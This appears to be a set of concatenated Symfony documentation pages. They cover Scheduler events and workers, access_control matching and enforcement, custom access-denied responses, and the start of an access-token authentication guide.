    public function onMessage(PreRunEvent $event): void
    {
        $schedule = $event->getSchedule();
        $context = $event->getMessageContext();
        $message = $event->getMessage();

        // do something with the schedule, context or message

        // and/or cancel message
        $event->shouldCancel(true);
    }

Execute this command to find out which listeners are registered for this event
and their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher "Symfony\Component\Scheduler\Event\PreRunEvent"

PostRunEvent
............

**Event Class**: :class:`Symfony\\Component\\Scheduler\\Event\\PostRunEvent`

``PostRunEvent`` allows to modify the :class:`Symfony\\Component\\Scheduler\\Schedule`
after a message is consumed::

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Scheduler\Event\PostRunEvent;

    public function onMessage(PostRunEvent $event): void
    {
        $schedule = $event->getSchedule();
        $context = $event->getMessageContext();
        $message = $event->getMessage();

        // do something with the schedule, context or message
    }

Execute this command to find out which listeners are registered for this event
and their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher "Symfony\Component\Scheduler\Event\PostRunEvent"

FailureEvent
............

**Event Class**: :class:`Symfony\\Component\\Scheduler\\Event\\FailureEvent`

``FailureEvent`` allows to modify the :class:`Symfony\\Component\\Scheduler\\Schedule`
when a message consumption throws an exception::

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Scheduler\Event\FailureEvent;

    public function onMessage(FailureEvent $event): void
    {
        $schedule = $event->getSchedule();
        $context = $event->getMessageContext();
        $message = $event->getMessage();

        $error = $event->getError();

        // do something with the schedule, context, message or error (logging, ...)

        // and/or ignore failure event
        $event->shouldIgnore(true);
    }

Execute this command to find out which listeners are registered for this event
and their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher "Symfony\Component\Scheduler\Event\FailureEvent"

.. _consuming-messages-running-the-worker:

Consuming Messages
------------------

The Scheduler component offers two ways to consume messages, depending on your
needs: using the ``messenger:consume`` command or creating a worker programmatically.
The first solution is the recommended one when using the Scheduler component in
the context of a full stack Symfony application, the second one is more suitable
when using the Scheduler component as a standalone component.

Running a Worker
~~~~~~~~~~~~~~~~

After defining and attaching your recurring messages to a schedule, you'll need
a mechanism to generate and consume the messages according to their defined frequencies.
To do that, the Scheduler component uses the ``messenger:consume`` command from
the Messenger component:

.. code-block:: terminal

    $ php bin/console messenger:consume scheduler_nameofyourschedule

    # use -vv if you need details about what's happening
    $ php bin/console messenger:consume scheduler_nameofyourschedule -vv

.. image:: /_images/components/scheduler/generate_consume.png
    :alt: Symfony Scheduler - generate and consume

Creating a Consumer Programmatically
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

An alternative to the previous solution is to create and call a worker that
will consume the messages. The component comes with a ready-to-use worker
named :class:`Symfony\\Component\\Scheduler\\Scheduler` that you can use in your
code::

    use Symfony\Component\Scheduler\Scheduler;

    $schedule = (new Schedule())
        ->with(
            RecurringMessage::trigger(
                new ExcludeHolidaysTrigger(
                    CronExpressionTrigger::fromSpec('@daily'),
                ),
                new SendDailySalesReports()
            ),
        );

    $scheduler = new Scheduler(handlers: [
        SendDailySalesReports::class => new SendDailySalesReportsHandler(),
        // add more handlers if you have more message types
    ], schedules: [
        $schedule,
        // the scheduler can take as many schedules as you need
    ]);

    // finally, run the scheduler once it's ready
    $scheduler->run();

.. note::

    The :class:`Symfony\\Component\\Scheduler\\Scheduler` may be used
    when using the Scheduler component as a standalone component. If
    you are using it in the framework context, it is highly recommended to
    use the ``messenger:consume`` command as explained in the previous
    section.

Debugging the Schedule
----------------------

The ``debug:scheduler`` command provides a list of schedules along with their
recurring messages. You can narrow down the list to a specific schedule:

.. code-block:: terminal

    $ php bin/console debug:scheduler

      Scheduler
      =========

      default
      -------

        ------------------- ------------------------- ----------------------
        Trigger             Provider                  Next Run
        ------------------- ------------------------- ----------------------
        every 2 days        App\Messenger\Foo(0:17..)  Sun, 03 Dec 2023 ...
        15 4 */3 * *        App\Messenger\Foo(0:17..)  Mon, 18 Dec 2023 ...
       -------------------- -------------------------- ---------------------

    # you can also specify a date to use for the next run date:
    $ php bin/console debug:scheduler --date=2025-10-18

    # you can also specify a date to use for the next run date for a schedule:
    $ php bin/console debug:scheduler name_of_schedule --date=2025-10-18

    # use the --all option to also display the terminated recurring messages
    $ php bin/console debug:scheduler --all

Efficient management with Symfony Scheduler
-------------------------------------------

When a worker is restarted or undergoes shutdown for a period, the Scheduler transport won't be able to generate the messages (because they are created on-the-fly by the scheduler transport).
This implies that any messages scheduled to be sent during the worker's inactive period are not sent, and the Scheduler will lose track of the last processed message.
Upon restart, it will recalculate the messages to be generated from that point onward.

To illustrate, consider a recurring message set to be sent every 3 days.
If a worker is restarted on day 2, the message will be sent 3 days from the restart, on day 5.

While this behavior may not necessarily pose a problem, there is a possibility that it may not align with what you are seeking.

That's why the scheduler allows to remember the last execution date of a message
via the ``stateful`` option (and the :doc:`Cache component </components/cache>`).
This allows the system to retain the state of the schedule, ensuring that when a worker is restarted, it resumes from the point it left off.::

    // src/Scheduler/SaleTaskProvider.php
    namespace App\Scheduler;

    #[AsSchedule('uptoyou')]
    class SaleTaskProvider implements ScheduleProviderInterface
    {
        public function getSchedule(): Schedule
        {
            $this->removeOldReports = RecurringMessage::cron('3 8 * * 1', new CleanUpOldSalesReport());

            return $this->schedule ??= (new Schedule())
                ->with(
                    // ...
                )
                ->stateful($this->cache)
        }
    }

To scale your schedules more effectively, you can use multiple workers. In such
cases, a good practice is to add a :doc:`lock </components/lock>` to prevent the
same task more than once::

    // src/Scheduler/SaleTaskProvider.php
    namespace App\Scheduler;

    #[AsSchedule('uptoyou')]
    class SaleTaskProvider implements ScheduleProviderInterface
    {
        public function getSchedule(): Schedule
        {
            $this->removeOldReports = RecurringMessage::cron('3 8 * * 1', new CleanUpOldSalesReport());

            return $this->schedule ??= (new Schedule())
                ->with(
                    // ...
                )
                ->lock($this->lockFactory->createLock('my-lock')
        }
    }

.. tip::

    The processing time of a message matters. If it takes a long time, all subsequent
    message processing may be delayed. So, it's a good practice to anticipate this
    and plan for frequencies greater than the processing time of a message.

Additionally, for better scaling of your schedules, you have the option to wrap
your message in a :class:`Symfony\\Component\\Messenger\\Message\\RedispatchMessage`.
This allows you to specify a transport on which your message will be redispatched
before being further redispatched to its corresponding handler::

    // src/Scheduler/SaleTaskProvider.php
    namespace App\Scheduler;

    #[AsSchedule('uptoyou')]
    class SaleTaskProvider implements ScheduleProviderInterface
    {
        public function getSchedule(): Schedule
        {
            return $this->schedule ??= (new Schedule())
                ->with(
                    RecurringMessage::every('5 seconds', new RedispatchMessage(new Message(), 'async'))
                );
        }
    }

When using the ``RedispatchMessage``, Symfony will attach a
:class:`Symfony\\Component\\Messenger\\Stamp\\ScheduledStamp` to the message,
helping you identify those messages when needed.

.. _`Memoizing`: https://en.wikipedia.org/wiki/Memoization
.. _`cron command-line utility`: https://en.wikipedia.org/wiki/Cron
.. _`crontab.guru website`: https://crontab.guru/
.. _`relative formats`: https://www.php.net/manual/en/datetime.formats.php#datetime.formats.relative
.. _security-access-control-explanation:

How Does the Security access_control Work?
==========================================

For each incoming request, Symfony checks each ``access_control`` entry
to find *one* that matches the current request. As soon as it finds a matching
``access_control`` entry, it stops - only the **first** matching ``access_control``
is used to enforce access.

Each ``access_control`` has several options that configure two different
things:

#. :ref:`should the incoming request match this access control entry <security-access-control-matching-options>`
#. :ref:`once it matches, should some sort of access restriction be enforced <security-access-control-enforcement-options>`:

.. _security-access-control-matching-options:

1. Matching Options
-------------------

Symfony uses :class:`Symfony\\Component\\HttpFoundation\\ChainRequestMatcher` for
each ``access_control`` entry, which determines which implementation of
:class:`Symfony\\Component\\HttpFoundation\\RequestMatcherInterface` should be used
on this request. The following ``access_control`` options are used for matching:

* ``path``: a regular expression (without delimiters)
* ``ip`` or ``ips``: netmasks are also supported (can be a comma-separated string)
* ``port``: an integer
* ``host``: a regular expression
* ``methods``: one or many HTTP methods
* ``request_matcher``: a service implementing ``RequestMatcherInterface``
* ``attributes``: an array, which can be used to specify one or more :ref:`request attributes <accessing-request-data>` that must match exactly
* ``route``: a route name

Take the following ``access_control`` entries as an example:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        parameters:
            env(TRUSTED_IPS): '10.0.0.1, 10.0.0.2'

        security:
            # ...
            access_control:
                - { path: '^/admin', roles: ROLE_USER_PORT, ip: 127.0.0.1, port: 8080 }
                - { path: '^/admin', roles: ROLE_USER_IP, ip: 127.0.0.1 }
                - { path: '^/admin', roles: ROLE_USER_HOST, host: symfony\.com$ }
                - { path: '^/admin', roles: ROLE_USER_METHOD, methods: [POST, PUT] }

                # ips can be comma-separated, which is especially useful when using env variables
                - { path: '^/admin', roles: ROLE_USER_IP, ips: '%env(TRUSTED_IPS)%' }
                - { path: '^/admin', roles: ROLE_USER_IP, ips: [127.0.0.1, ::1, '%env(TRUSTED_IPS)%'] }

                # for custom matching needs, use a request matcher service
                - { roles: ROLE_USER, request_matcher: App\Security\RequestMatcher\MyRequestMatcher }

                # require ROLE_ADMIN for 'admin' route. You can use the shortcut "route: "xxx", instead of "attributes": ["_route": "xxx"]
                - { attributes: {'_route': 'admin'}, roles: ROLE_ADMIN }
                - { route: 'admin', roles: ROLE_ADMIN }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <srv:parameters>
                <srv:parameter key="env(TRUSTED_IPS)">10.0.0.1, 10.0.0.2</srv:parameter>
            </srv:parameters>

            <config>
                <!-- ... -->
                <rule path="^/admin" role="ROLE_USER_PORT" ip="127.0.0.1" port="8080"/>
                <rule path="^/admin" role="ROLE_USER_IP" ip="127.0.0.1"/>
                <rule path="^/admin" role="ROLE_USER_HOST" host="symfony\.com$"/>
                <rule path="^/admin" role="ROLE_USER_METHOD" methods="POST, PUT"/>

                <!-- ips can be comma-separated, which is especially useful when using env variables -->
                <rule path="^/admin" role="ROLE_USER_IP" ip="%env(TRUSTED_IPS)%"/>
                <rule path="^/admin" role="ROLE_USER_IP">
                    <ip>127.0.0.1</ip>
                    <ip>::1</ip>
                    <ip>%env(TRUSTED_IPS)%</ip>
                </rule>

                <!-- for custom matching needs, use a request matcher service -->
                <rule role="ROLE_USER" request-matcher="App\Security\RequestMatcher\MyRequestMatcher"/>

                <!-- require ROLE_ADMIN for 'admin' route. You can use the shortcut route="xxx" -->
                <rule role="ROLE_ADMIN">
                    <attribute key="_route">admin</attribute>
                </rule>
                <rule route="admin" role="ROLE_ADMIN"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Component\DependencyInjection\ContainerBuilder;
        use Symfony\Config\SecurityConfig;

        return static function (ContainerBuilder $container, SecurityConfig $security): void {
            $container->setParameter('env(TRUSTED_IPS)', '10.0.0.1, 10.0.0.2');
            // ...

            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_USER_PORT'])
                ->ips(['127.0.0.1'])
                ->port(8080)
            ;
            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_USER_IP'])
                ->ips(['127.0.0.1'])
            ;
            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_USER_HOST'])
                ->host('symfony\.com$')
            ;
            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_USER_METHOD'])
                ->methods(['POST', 'PUT'])
            ;
            // ips can be comma-separated, which is especially useful when using env variables
            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_USER_IP'])
                ->ips([env('TRUSTED_IPS')])
            ;
            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_USER_IP'])
                ->ips(['127.0.0.1', '::1', env('TRUSTED_IPS')])
            ;

            // for custom matching needs, use a request matcher service
            $security->accessControl()
                ->roles(['ROLE_USER'])
                ->requestMatcher('App\Security\RequestMatcher\MyRequestMatcher')
            ;

            // require ROLE_ADMIN for 'admin' route. You can use the shortcut route('xxx') method,
            // instead of attributes(['_route' => 'xxx']) method
            $security->accessControl()
                ->roles(['ROLE_ADMIN'])
                ->attributes(['_route' => 'admin'])
            ;
            $security->accessControl()
                ->roles(['ROLE_ADMIN'])
                ->route('admin')
            ;
        };

For each incoming request, Symfony will decide which ``access_control``
to use based on the URI, the client's IP address, the incoming host name,
and the request method. Remember, the first rule that matches is used, and
if ``ip``, ``port``, ``host`` or ``method`` are not specified for an entry, that
``access_control`` will match any ``ip``, ``port``, ``host`` or ``method``.
See the following examples:

Example #1:
  * **URI** ``/admin/user``
  * **IP**: ``127.0.0.1``, **Port**: ``80``, **Host**: ``example.com``, **Method**: ``GET``
  * **Rule applied**: rule #2 (``ROLE_USER_IP``)
  * **Why?** The URI matches ``path`` and the IP matches ``ip``.
Example #2:
  * **URI** ``/admin/user``
  * **IP**: ``127.0.0.1``, **Port**: ``80``, **Host**: ``symfony.com``, **Method**: ``GET``
  * **Rule applied**: rule #2 (``ROLE_USER_IP``)
  * **Why?** The ``path`` and ``ip`` still match. This would also match the
    ``ROLE_USER_HOST`` entry, but *only* the **first** ``access_control`` match is used.
Example #3:
  * **URI** ``/admin/user``
  * **IP**: ``127.0.0.1``, **Port**: ``8080``, **Host**: ``symfony.com``, **Method**: ``GET``
  * **Rule applied**: rule #1 (``ROLE_USER_PORT``)
  * **Why?** The ``path``, ``ip`` and ``port`` match.
Example #4:
  * **URI** ``/admin/user``
  * **IP**: ``168.0.0.1``, **Port**: ``80``, **Host**: ``symfony.com``, **Method**: ``GET``
  * **Rule applied**: rule #3 (``ROLE_USER_HOST``)
  * **Why?** The ``ip`` doesn't match neither the first rule nor the second rule.
  * So the third rule (which matches) is used.
Example #5:
  * **URI** ``/admin/user``
  * **IP**: ``168.0.0.1``, **Port**: ``80``, **Host**: ``symfony.com``, **Method**: ``POST``
  * **Rule applied**: rule #3 (``ROLE_USER_HOST``)
  * **Why?** The third rule still matches. This would also match the fourth rule
  * (``ROLE_USER_METHOD``), but only the **first** matched ``access_control`` is used.
Example #6:
  * **URI** ``/admin/user``
  * **IP**: ``168.0.0.1``, **Port**: ``80``, **Host**: ``example.com``, **Method**: ``POST``
  * **Rule applied**: rule #4 (``ROLE_USER_METHOD``)
  * **Why?** The ``ip`` and ``host`` don't match the first three entries, but
  * the fourth - ``ROLE_USER_METHOD`` - matches and is used.
Example #7:
  * **URI** ``/foo``
  * **IP**: ``127.0.0.1``, **Port**: ``80``, **Host**: ``symfony.com``, **Method**: ``POST``
  * **Rule applied**: matches no entries
  * **Why?** This doesn't match any ``access_control`` rules, since its URI
  * doesn't match any of the ``path`` values.

.. caution::

    Matching the URI is done without ``$_GET`` parameters.
    :ref:`Deny access in PHP code <security-securing-controller>` if you want
    to disallow access based on ``$_GET`` parameter values.

.. _security-access-control-enforcement-options:

2. Access Enforcement
---------------------

Once Symfony has decided which ``access_control`` entry matches (if any),
it then *enforces* access restrictions based on the ``roles``, ``allow_if`` and ``requires_channel``
options:

* ``roles`` If the user does not have the given role, then access is denied
  (internally, an :class:`Symfony\\Component\\Security\\Core\\Exception\\AccessDeniedException`
  is thrown).

* ``allow_if`` If the expression returns false, then access is denied;

* ``requires_channel`` If the incoming request's channel (e.g. ``http``)
  does not match this value (e.g. ``https``), the user will be redirected
  (e.g. redirected from ``http`` to ``https``, or vice versa).

.. tip::

    Behind the scenes, the array value of ``roles`` is passed as the
    ``$attributes`` argument to each voter in the application with the
    :class:`Symfony\\Component\\HttpFoundation\\Request` as ``$subject``. You
    can learn how to use your custom attributes by reading
    :ref:`security/custom-voter`.

.. caution::

    If you define both ``roles`` and ``allow_if``, and your Access Decision
    Strategy is the default one (``affirmative``), then the user will be granted
    access if there's at least one valid condition. If this behavior doesn't fit
    your needs, :ref:`change the Access Decision Strategy <security-voters-change-strategy>`.

.. tip::

    If access is denied, the system will try to authenticate the user if not
    already (e.g. redirect the user to the login page). If the user is already
    logged in, the 403 "access denied" error page will be shown. See
    :doc:`/controller/error_pages` for more information.

Matching access_control By IP
-----------------------------

Certain situations may arise when you need to have an ``access_control``
entry that *only* matches requests coming from some IP address or range.
For example, this *could* be used to deny access to a URL pattern to all
requests *except* those from a trusted, internal server.

.. caution::

    As you'll read in the explanation below the example, the ``ips`` option
    does not restrict to a specific IP address. Instead, using the ``ips``
    key means that the ``access_control`` entry will only match this IP address,
    and users accessing it from a different IP address will continue down
    the ``access_control`` list.

Here is an example of how you configure some example ``/internal*`` URL
pattern so that it is only accessible by requests from the local server itself:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            access_control:
                #
                # the 'ips' option supports IP addresses and subnet masks
                - { path: '^/internal', roles: PUBLIC_ACCESS, ips: [127.0.0.1, ::1, 192.168.0.1/24] }
                - { path: '^/internal', roles: ROLE_NO_ACCESS }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <!-- the 'ips' option supports IP addresses and subnet masks -->
                <rule path="^/internal" role="PUBLIC_ACCESS">
                    <ip>127.0.0.1</ip>
                    <ip>::1</ip>
                </rule>

                <rule path="^/internal" role="ROLE_NO_ACCESS"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->accessControl()
                ->path('^/internal')
                ->roles(['PUBLIC_ACCESS'])
                // the 'ips' option supports IP addresses and subnet masks
                ->ips(['127.0.0.1', '::1'])
            ;

            $security->accessControl()
                ->path('^/internal')
                ->roles(['ROLE_NO_ACCESS'])
            ;
        };

Here is how it works when the path is ``/internal/something`` coming from
the external IP address ``10.0.0.1``:

* The first access control rule is ignored as the ``path`` matches but the
  IP address does not match either of the IPs listed;

* The second access control rule is enabled (the only restriction being the
  ``path``) and so it matches. If you make sure that no users ever have
  ``ROLE_NO_ACCESS``, then access is denied (``ROLE_NO_ACCESS`` can be anything
  that does not match an existing role, it only serves as a trick to always
  deny access).

But if the same request comes from ``127.0.0.1`` or ``::1`` (the IPv6 loopback
address):

* Now, the first access control rule is enabled as both the ``path`` and the
  ``ip`` match: access is allowed as the user always has the
  ``PUBLIC_ACCESS`` role.

* The second access rule is not examined as the first rule matched.

.. _security-allow-if:

Securing by an Expression
~~~~~~~~~~~~~~~~~~~~~~~~~

Once an ``access_control`` entry is matched, you can deny access via the
``roles`` key or use more complex logic with an expression in the ``allow_if``
key:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            access_control:
                -
                    path: ^/_internal/secure
                    # the 'roles' and 'allow_if' options work like an OR expression, so
                    # access is granted if the expression is TRUE or the user has ROLE_ADMIN
                    roles: 'ROLE_ADMIN'
                    allow_if: "'127.0.0.1' == request.getClientIp() or request.headers.has('X-Secure-Access')"

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <!-- the 'role' and 'allow-if' options work like an OR expression, so
                     access is granted if the expression is TRUE or the user has ROLE_ADMIN -->
                <rule path="^/_internal/secure"
                    role="ROLE_ADMIN"
                    allow-if="'127.0.0.1' == request.getClientIp() or request.headers.has('X-Secure-Access')"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->accessControl()
                ->path('^/_internal/secure')
                // the 'role' and 'allow-if' options work like an OR expression, so
                // access is granted if the expression is TRUE or the user has ROLE_ADMIN
                ->roles(['ROLE_ADMIN'])
                ->allowIf('"127.0.0.1" == request.getClientIp() or request.headers.has("X-Secure-Access")')
            ;
        };

In this case, when the user tries to access any URL starting with
``/_internal/secure``, they will only be granted access if the IP address is
``127.0.0.1`` or a secure header, or if the user has the ``ROLE_ADMIN`` role.

.. note::

    Internally ``allow_if`` triggers the built-in
    :class:`Symfony\\Component\\Security\\Core\\Authorization\\Voter\\ExpressionVoter`
    as like it was part of the attributes defined in the ``roles`` option.

Inside the expression, you have access to a number of different variables
and functions including ``request``, which is the Symfony
:class:`Symfony\\Component\\HttpFoundation\\Request` object (see
:ref:`component-http-foundation-request`).

For a list of the other functions and variables, see
:ref:`functions and variables <security-expression-variables>`.

.. tip::

    The ``allow_if`` expressions can also contain custom functions registered
    with :ref:`expression providers <components-expression-language-provider>`.

Restrict to a port
------------------

Add the ``port`` option to any ``access_control`` entries to require users to
access those URLs via a specific port. This could be useful for example for
``localhost:8080``.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            access_control:
                - { path: ^/cart/checkout, roles: PUBLIC_ACCESS, port: 8080 }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <rule path="^/cart/checkout"
                    role="PUBLIC_ACCESS"
                    port="8080"
                />
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->accessControl()
                ->path('^/cart/checkout')
                ->roles(['PUBLIC_ACCESS'])
                ->port(8080)
            ;
        };

Forcing a Channel (http, https)
-------------------------------

You can also require a user to access a URL via SSL; use the
``requires_channel`` argument in any ``access_control`` entries. If this
``access_control`` is matched and the request is using the ``http`` channel,
the user will be redirected to ``https``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            access_control:
                - { path: ^/cart/checkout, roles: PUBLIC_ACCESS, requires_channel: https }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <rule path="^/cart/checkout"
                    role="PUBLIC_ACCESS"
                    requires-channel="https"
                />
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->accessControl()
                ->path('^/cart/checkout')
                ->roles(['PUBLIC_ACCESS'])
                ->requiresChannel('https')
            ;
        };
How to Customize Access Denied Responses
========================================

In Symfony, you can throw an
:class:`Symfony\\Component\\Security\\Core\\Exception\\AccessDeniedException`
to disallow access to the user. Symfony will handle this exception and
generates a response based on the authentication state:

* **If the user is not authenticated** (or authenticated anonymously), an
  authentication entry point is used to generate a response (typically
  a redirect to the login page or an *401 Unauthorized* response);
* **If the user is authenticated, but does not have the required
  permissions**, a *403 Forbidden* response is generated.

.. _security-entry-point:

Customize the Unauthorized Response
-----------------------------------

You need to create a class that implements
:class:`Symfony\\Component\\Security\\Http\\EntryPoint\\AuthenticationEntryPointInterface`.
This interface has one method (``start()``) that is called whenever an
unauthenticated user tries to access a protected resource::

    // src/Security/AuthenticationEntryPoint.php
    namespace App\Security;

    use Symfony\Component\HttpFoundation\RedirectResponse;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
    use Symfony\Component\Security\Core\Exception\AuthenticationException;
    use Symfony\Component\Security\Http\EntryPoint\AuthenticationEntryPointInterface;

    class AuthenticationEntryPoint implements AuthenticationEntryPointInterface
    {
        public function __construct(
            private UrlGeneratorInterface $urlGenerator,
        ) {
        }

        public function start(Request $request, ?AuthenticationException $authException = null): RedirectResponse
        {
            // add a custom flash message and redirect to the login page
            $request->getSession()->getFlashBag()->add('note', 'You have to login in order to access this page.');

            return new RedirectResponse($this->urlGenerator->generate('security_login'));
        }
    }

That's it if you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`.
Otherwise, you have to register this service in the container.

Now, configure this service ID as the entry point for the firewall:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        firewalls:
            # ...

            main:
                # ...
                entry_point: App\Security\AuthenticationEntryPoint

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <config>
                <firewall name="main"
                    entry-point="App\Security\AuthenticationEntryPoint"
                >
                    <!-- ... -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\AuthenticationEntryPoint;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                // ....
                ->entryPoint(AuthenticationEntryPoint::class)
            ;
        };

Customize the Forbidden Response
--------------------------------

Create a class that implements
:class:`Symfony\\Component\\Security\\Http\\Authorization\\AccessDeniedHandlerInterface`.
This interface defines one method called ``handle()`` where you can
implement whatever logic that should execute when access is denied for the
current user (e.g. send a mail, log a message, or generally return a custom
response)::

    // src/Security/AccessDeniedHandler.php
    namespace App\Security;

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Security\Core\Exception\AccessDeniedException;
    use Symfony\Component\Security\Http\Authorization\AccessDeniedHandlerInterface;

    class AccessDeniedHandler implements AccessDeniedHandlerInterface
    {
        public function handle(Request $request, AccessDeniedException $accessDeniedException): ?Response
        {
            // ...

            return new Response($content, 403);
        }
    }

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
you're done! Symfony will automatically know about your new service. You can then
configure it under your firewall:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        firewalls:
            # ...

            main:
                # ...
                access_denied_handler: App\Security\AccessDeniedHandler

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <config>
                <firewall name="main"
                    access-denied-handler="App\Security\AccessDeniedHandler"
                >
                    <!-- ... -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\AccessDeniedHandler;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                // ....
                ->accessDeniedHandler(AccessDeniedHandler::class)
            ;
        };

Customizing All Access Denied Responses
---------------------------------------

In some cases, you might want to customize both responses or do a specific
action (e.g. logging) for each ``AccessDeniedException``. In this case,
configure a :ref:`kernel.exception listener <use-kernel-exception-event>`::

    // src/EventListener/AccessDeniedListener.php
    namespace App\EventListener;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Event\ExceptionEvent;
    use Symfony\Component\HttpKernel\KernelEvents;
    use Symfony\Component\Security\Core\Exception\AccessDeniedException;

    class AccessDeniedListener implements EventSubscriberInterface
    {
        public static function getSubscribedEvents(): array
        {
            return [
                // the priority must be greater than the Security HTTP
                // ExceptionListener, to make sure it's called before
                // the default exception listener
                KernelEvents::EXCEPTION => ['onKernelException', 2],
            ];
        }

        public function onKernelException(ExceptionEvent $event): void
        {
            $exception = $event->getThrowable();
            if (!$exception instanceof AccessDeniedException) {
                return;
            }

            // ... perform some action (e.g. logging)

            // optionally set the custom response
            $event->setResponse(new Response(null, 403));

            // or stop propagation (prevents the next exception listeners from being called)
            //$event->stopPropagation();
        }
    }
How to use Access Token Authentication
======================================

Access tokens or API tokens are commonly used as authentication mechanism
in API contexts. The access token is a string, obtained during authentication
(using the application or an authorization server). The access token's role
is to verify the user identity and receive consent before the token is
issued.

Access tokens can be of any kind, for instance opaque strings,
`JSON Web Tokens (JWT)`_ or `SAML2 (XML structures)`_. Please refer to the
`RFC6750`_: *The OAuth 2.0 Authorization Framework: Bearer Token Usage* for
a detailed specification.

Using the Access Token Authenticator
------------------------------------

